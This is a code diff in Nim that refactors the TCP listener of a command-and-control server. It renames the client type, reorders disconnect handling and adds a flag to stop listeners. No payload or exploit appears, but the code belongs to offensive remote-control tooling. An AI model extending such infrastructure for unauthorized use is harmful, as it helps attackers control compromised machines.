@@ -2,19 +2,18 @@ import asyncdispatch, asyncnet, asyncfutures, strutils
 
 import ../types, ../logging
 
-proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: Client) {.async.} =
+proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {.async.} =
 
   while true:
     let line = await tcpSocket.socket.recvLine()
     
     let args = line.split(":")
-    let argsn = len(args)
     let cmd = args[0]
 
     if line.len == 0:
-      cDisconnected(client)  
       client.connected = false
       tcpSocket.socket.close()
+      cDisconnected(client)  
       return
     
     case cmd:
@@ -39,7 +38,8 @@ proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.a
       port: port,
       listeningIP: ip,
       id: id, 
-      socket: newAsyncSocket()
+      socket: newAsyncSocket(),
+      running: true
     )
   )
   server.tcpListeners[id].socket.bindAddr(port.Port, ip)
@@ -47,10 +47,10 @@ proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.a
   
   infoLog "listening on localhost:" & intToStr(port)
   
-  while true:
+  while server.tcpListeners[id].running:
     let (netAddr, clientSocket) = await server.tcpListeners[id].socket.acceptAddr()
 
-    let client = Client(
+    let client = C2Client(
       listenerType: "tcp",
       listenerId: id,
       id: server.clients.len,
@@ -73,3 +73,4 @@ proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.a
     cConnected(client)
     asyncCheck processMessages(server, tcpSocket, client)
 
+  infoLog $server.tcpListeners[id] & " stopped"
